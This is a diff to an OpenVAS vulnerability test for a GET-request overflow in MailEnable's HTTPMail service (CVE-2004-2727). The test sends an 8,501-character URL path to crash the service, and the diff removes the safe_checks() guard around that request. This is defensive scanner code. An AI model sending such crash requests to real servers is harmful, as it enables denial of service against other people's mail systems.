@@ -1,5 +1,5 @@
 # OpenVAS Vulnerability Test
-# $Id: mailenable_httpmail_get_overflow.nasl 5390 2017-02-21 18:39:27Z mime $
+# $Id: mailenable_httpmail_get_overflow.nasl 5785 2017-03-30 09:19:35Z cfi $
 # Description: MailEnable HTTPMail Service GET Overflow Vulnerability
 #
 # Authors:
@@ -33,36 +33,25 @@ execution.";
 tag_solution = "Upgrade to MailEnable Professional / Enterprise 1.19 or
 later.";
 
-if (description) {
+if (description)
+{
   script_id(14656);
-  script_version("$Revision: 5390 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
+  script_version("$Revision: 5785 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-30 11:19:35 +0200 (Thu, 30 Mar 2017) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_tag(name:"cvss_base", value:"4.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
- script_cve_id("CVE-2004-2727");
- script_bugtraq_id(10312);
-
+  script_cve_id("CVE-2004-2727");
+  script_bugtraq_id(10312);
   script_xref(name:"OSVDB", value:"6037");
-
-  name = "MailEnable HTTPMail Service GET Overflow Vulnerability";
-  script_name(name);
- 
- 
-  summary = "Checks for GET Overflow Vulnerability in MailEnable HTTPMail Service";
-  script_summary(summary);
- 
+  script_name("MailEnable HTTPMail Service GET Overflow Vulnerability");
   script_category(ACT_DENIAL);
   script_tag(name:"qod_type", value:"remote_vul");
   script_copyright("This script is Copyright (C) 2004 George A. Theall");
-
-  family = "Denial of Service";
-  script_family(family);
-
+  script_family("Denial of Service");
   script_require_ports("Services/www", 8080, 80 );
   script_dependencies("global_settings.nasl", "gb_get_http_banner.nasl");
   script_mandatory_keys("MailEnable/banner");
-
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
   exit(0);
@@ -71,34 +60,23 @@ if (description) {
 include("global_settings.inc");
 include("http_func.inc");
 
-host = get_host_name();
 # nb: HTTPMail defaults to 8080 but can run on any port. 
-port = 8080;
-if (get_port_state(port)) soc = http_open_socket(port);
-if (!soc) {
-    port = get_http_port(default:80);
-    if (get_port_state(port)) soc = http_open_socket(port);
-}
-if (!soc) {
-  if (log_verbosity > 1) display("Can't determine port for MailEnable's HTTPMail service!\n");
-  exit(1);
-}
-http_close_socket(soc);
-if (debug_level) display("debug: searching for GET Overflow vulnerability in MailEnable HTTPMail Service on ", host, ":", port, ".\n");
+port = get_http_port(default:8080);
 
 # Make sure banner's from MailEnable.
-banner = get_http_banner(port);
+banner = get_http_banner(port:port);
 if (debug_level) display("debug: banner =>>", banner, "<<.\n");
 if (!egrep(pattern:"^Server: .*MailEnable", string:banner)) exit(0);
 
+host = http_host_name( port:port );
+
 # Try to bring it down.
-if (safe_checks() == 0) {
   soc = http_open_socket(port);
   if (soc) {
     req = string(
       # assume logging is disabled.
       "GET /", crap(length:8501, data:"X"), " HTTP/1.0\r\n",
-      "Host: ", get_host_name(), "\r\n",
+      "Host: ", host, "\r\n",
       "\r\n"
     );
     if (debug_level) display("debug: sending =>>", req, "<<\n");
@@ -117,4 +95,3 @@ if (safe_checks() == 0) {
 
     }
   }
-}
